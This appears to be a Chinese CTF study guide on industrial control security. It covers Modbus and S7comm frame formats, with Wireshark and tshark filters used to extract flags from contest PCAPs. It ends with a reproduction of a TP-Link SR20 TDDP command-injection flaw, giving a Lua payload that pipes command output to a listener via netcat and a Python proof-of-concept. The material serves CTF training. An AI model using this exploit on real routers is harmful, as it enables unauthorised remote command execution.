b:T420c,<h2 id="ctf工控安全经验总结-从协议分析到固件逆向">CTF工控安全经验总结——从协议分析到固件逆向</h2>
<h3 id="一-工控安全概述">一、工控安全概述</h3>
<p>工控安全（ICS Security）在 CTF 中的比重逐年增加，主要考察工业控制系统（ICS）与 SCADA（数据采集与监视控制）系统的协议分析、固件逆向、漏洞利用等能力。工控题目与传统的流量分析、逆向、PWN 均有交叉。</p>
<p><strong>核心能力要求：</strong></p>
<ul>
<li>熟悉常见工控协议（Modbus、S7comm、DNP3、IEC 104、OPC UA 等）的帧结构与功能码</li>
<li>掌握工控流量分析（Wireshark 过滤、tshark 提取）</li>
<li>掌握固件提取与模拟（binwalk、firmadyne、QEMU）</li>
<li>了解工控系统常见漏洞类型与利用方式</li>
</ul>
<p><strong>常见题型：</strong></p>
<ol>
<li>工控流量分析：从 PCAP 中提取异常流量、解码协议数据</li>
<li>固件逆向：解包固件、提取文件系统、挖掘漏洞</li>
<li>协议重放/伪造：构造协议报文触发异常</li>
<li>组态分析：还原组态工程、梯形图逻辑</li>
</ol>
<hr>
<h3 id="二-工控协议分析">二、工控协议分析</h3>
<h4 id="2-1-modbus-协议">2.1 Modbus 协议</h4>
<h5 id="2-1-1-协议概述">2.1.1 协议概述</h5>
<p>Modbus 是由 Modicon（现施耐德）于 1979 年发布的工业现场总线协议，是应用最广泛的工控协议之一。流量主要有三类：<strong>Modbus/RTU</strong>、<strong>Modbus/ASCII</strong>、<strong>Modbus/TCP</strong>。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>传输介质</th>
<th>端口</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td>Modbus/RTU</td>
<td>串口（RS-232/485）</td>
<td>—</td>
<td>二进制编码，效率高</td>
</tr>
<tr>
<td>Modbus/ASCII</td>
<td>串口</td>
<td>—</td>
<td>ASCII 编码，便于调试</td>
</tr>
<tr>
<td>Modbus/TCP</td>
<td>以太网</td>
<td>502</td>
<td>基于 TCP，最常用于 CTF</td>
</tr>
</tbody>
</table>
<p><strong>Modbus/RTU 帧格式：</strong></p>
<pre><code>从机地址 1B + 功能码 1B + 数据字段 xB + CRC值 2B
最大长度 256B，因此数据字段最大 252B
</code></pre>
<p><strong>Modbus/ASCII 帧格式：</strong></p>
<pre><code>开始标记(:0x3A) 1B + 从机地址 2B + 功能码 2B + 数据字段 xB + LRC值 2B + 结束标记(\r\n) 2B
由 RTU 衍生，用 0-9 A-F 表示原本的从机地址、功能码、数据字段，长度翻倍
最大长度 513B（数据字段 RTU 最大 252B，ASCII 最大 504B）
</code></pre>
<p><strong>Modbus/TCP 帧格式：</strong></p>
<pre><code>事务标识符 2B + 协议标识符 2B + 长度 2B + 单元标识符(UnitID) 1B + 功能码 1B + 数据字段 xB
不再需要从机地址（改用 UnitID）；不再需要 CRC/LRC（TCP 自带校验）
</code></pre>
<h5 id="2-1-2-功能码">2.1.2 功能码</h5>
<p>CTF 中主要考察 Modbus/TCP 的功能码，解题时配合过滤器逐一看过去即可：</p>
<table>
<thead>
<tr>
<th>功能码</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>读线圈（Read Coils）</td>
</tr>
<tr>
<td>2</td>
<td>读离散输入（Read Discrete Inputs）</td>
</tr>
<tr>
<td>3</td>
<td>读保持寄存器（Read Holding Registers）</td>
</tr>
<tr>
<td>4</td>
<td>读输入寄存器（Read Input Registers）</td>
</tr>
<tr>
<td>5</td>
<td>写单个线圈（Write Single Coil）</td>
</tr>
<tr>
<td>6</td>
<td>写单个保持寄存器（Write Single Register）</td>
</tr>
<tr>
<td>15</td>
<td>写多个线圈（Write Multiple Coils）</td>
</tr>
<tr>
<td>16</td>
<td>写多个保持寄存器（Write Multiple Registers）</td>
</tr>

</table>
<p><strong>异常流量定位思路：</strong> 大部分流量都是正常的，异常流量一定是小部分。依次查看每个 <code>func_code</code>，根据字段排除正常流量。</p>
<p>例如：先查看 <code>(modbus) &#x26;&#x26; (modbus.func_code == 17)</code>，发现大量 <code>modbus.data == 06:00:00</code> 的流量，则过滤：</p>
<pre><code>((modbus) &#x26;&#x26; (modbus.func_code == 17)) &#x26;&#x26; !(modbus.data == 06:00:00)
</code></pre>
<p>依次过滤正常流量，最后剩下的就是异常流量。</p>
<h5 id="2-1-3-例题">2.1.3 例题</h5>
<p><strong>例题：HNGK-Modbus 流量分析</strong></p>
<p>直接使用过滤器即可得到 flag：</p>
<pre><code>(((_ws.col.protocol == "Modbus/TCP") ) &#x26;&#x26; (modbus.byte_cnt)) &#x26;&#x26; (modbus.func_code == 16)
</code></pre>
<p>结果：<code>flag{TheModbusProtocolIsFunny!}</code></p>
<p><strong>例题：HNGK-Modbus 协议分析</strong></p>
<p>流量包中 <code>modbus.func_code</code> 只有 2、3、4、16 四种。2 和 16 无异常，3 和 4 中寄存器的值存在异常：</p>
<ul>
<li><code>func_code == 3</code> 的包中寄存器值一直在增加，最终写入内容</li>
<li><code>func_code == 4</code> 的包一直在读寄存器，内容和上面一致</li>
</ul>
<p>因此逻辑是：3 先写入寄存器的值，4 再读取并发送。重点分析这段数据，因有不可见字符，复制为 Hex 格式：</p>
<pre><code>(((modbus) &#x26;&#x26; (modbus.func_code == 3)) &#x26;&#x26; (ip.src == 192.168.161.2)) &#x26;&#x26; (modbus.byte_cnt)
</code></pre>
<h4 id="2-2-s7comm-协议-西门子">2.2 S7comm 协议（西门子）</h4>
<h5 id="2-2-1-协议概述">2.2.1 协议概述</h5>
<p>S7comm 是西门子 S7 系列 PLC 的通信协议，基于 COTP（ISO 8073，端口 102）实现，是 COTP 的上层协议。主要有三种类型：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Job（1）</td>
<td>下发任务/指令</td>
</tr>
<tr>
<td>Ack_Data（3）/Ack（2）</td>
<td>带有返回数据 / 单纯确认</td>
</tr>
<tr>
<td>Userdata（7）</td>
<td>用户自定义数据区，也包含功能指令</td>
</tr>
</tbody>
</table>
<h5 id="2-2-2-例题">2.2.2 例题</h5>
<p><strong>例题1：2020ICSC 湖州站—工控协议数据分析</strong></p>
<p>过滤出 S7 协议数据包，发现一些 Ack_Data 数据包中传输了二进制数据；同时一些 Job 数据包中也有二进制数据。过滤并导出：</p>
<pre><code>((s7comm) &#x26;&#x26; (s7comm.resp.data)) &#x26;&#x26; (s7comm.param.func == 0x05)
</code></pre>
<p>使用 tshark 提取数据：</p>
<pre><code class="hljs language-bash">tshark -r 1.pcap -T fields -e s7comm.resp.data | <span class="hljs-built_in">uniq</span>
</code></pre>
<p>最后用 CyberChef 解码二进制即可得到 flag。</p>
<p><strong>例题2：2020ICSC 济南站—被篡改的数据</strong></p>
<p>大量 S7COMM 数据包中 <code>s7comm.resp.data</code> 字段传了很多 <code>66</code> 数据。过滤出传了 <code>resp.data</code> 但数据不是 <code>66</code> 的 S7 数据包，发现疑似 flag 数据（防止 flag 中含 <code>f</code> 被过滤）：</p>
<pre><code>(((frame.number >= 19987 &#x26;&#x26; frame.number &#x3C;= ...))) ...
</code></pre>
<p>tshark 提取后十六进制解码得到 <code>flag{93137ad4a}</code>。</p>
<p><strong>例题3：枢网智盾 2021—异常流分析</strong></p>
<p>大量 S7comm 流量，写入数据几乎都是 <code>ffff</code> 开头，直接查看不是 <code>ffff</code> 开头的数据：</p>
<pre><code>((_ws.col.protocol == "S7COMM") &#x26;&#x26; (s7comm.param.func == 0x05)) &#x26;&#x26; (s7comm.resp.data[0:2] != ff:ff)
</code></pre>
<p>得到 <code>flag{ffad28a0ce69db34751f}</code>。</p>
<p><strong>例题4：枢网智盾 2021—工控协议分析</strong></p>
<pre><code>(_ws.col.protocol == "S7COMM") &#x26;&#x26; (frame.number == 418)
</code></pre>
<p>直接把明文传输的数据 base64 解码即可：<code>flag{hncome66!}</code>。</p>

<h4 id="3-3-实例-tp-link-sr20-本地网络远程代码执行漏洞">3.3 实例：TP-Link SR20 本地网络远程代码执行漏洞</h4>
<p><strong>漏洞概述：</strong> TP-Link SR20 路由器的 TDDP（TP-Link Device Debug Protocol）协议存在命令注入，攻击者可未认证执行任意命令（CVE-2019-12199 等）。</p>
<p><strong>固件获取：</strong> 下载 SR20(US)_V1_180518，解压后用 binwalk 提取。</p>
<p><strong>漏洞复现要点：</strong></p>
<p>payload 文件（放入宿主机的 <code>/tftpboot</code> 目录）：</p>
<pre><code class="hljs language-lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">config_test</span><span class="hljs-params">(config)</span></span>
  <span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">"id | nc 10.10.10.1 1337"</span>)
<span class="hljs-keyword">end</span>
</code></pre>
<p>poc.py（发送 TDDP 报文触发命令注入）：</p>
<pre><code class="hljs language-python"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># Copyright 2019 Google LLC.</span>
<span class="hljs-comment"># SPDX-License-Identifier: Apache-2.0</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> socket

port_send = <span class="hljs-number">1040</span>
port_receive = <span class="hljs-number">61000</span>

tddp_ver = <span class="hljs-string">"01"</span>
tddp_command = <span class="hljs-string">"31"</span>
tddp_req = <span class="hljs-string">"01"</span>
tddp_reply = <span class="hljs-string">"00"</span>
tddp_padding = <span class="hljs-string">"%0.16X"</span> % <span class="hljs-number">00</span>

tddp_packet = <span class="hljs-string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind((<span class="hljs-string">''</span>, port_receive))

sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = <span class="hljs-string">"%s;arbitrary"</span> % sys.argv[<span class="hljs-number">2</span>]
packet = packet + argument.encode()
sock_send.sendto(packet, (sys.argv[<span class="hljs-number">1</span>], port_send))
sock_send.close()

response, addr = sock_receive.recvfrom(<span class="hljs-number">1024</span>)
r = response.encode(<span class="hljs-string">'hex'</span>)
<span class="hljs-built_in">print</span>(r)
</code></pre>
